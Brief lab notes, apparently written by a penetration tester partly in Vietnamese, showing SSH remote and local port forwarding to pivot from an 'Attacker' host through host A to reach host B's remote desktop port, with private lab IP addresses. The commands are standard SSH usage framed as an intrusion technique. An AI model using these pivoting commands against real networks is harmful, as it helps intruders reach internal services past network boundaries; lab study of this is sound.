Attacker: 192.168.157.134
A: 192.168.157.138
B: 192.168.157.137

Remote port forwarding: (Mo port o Attacker)
on A:
ssh -R [ATTACKER IP]:[ATTACKER PORT]:[B IP]:[B PORT] [ATTACKER IP]
e.g:
ssh -R 192.168.157.134:3390:192.168.157.137:3389 192.168.157.134
Remote desktop port 3389 on B will connect to port 3390 on Attacker through A

Local port forwarding: (Mo port o A)
on A:
ssh -L [A IP]:[A PORT]:[localhost/0.0.0.0 khong quan trong]:[ATTACKER PORT] [ATTACKER IP]
e.g
ssh -L 192.168.157.138:1234:0.0.0.0:80 192.168.157.134
Port 1234 on A will connect to web port 80 on Attacker
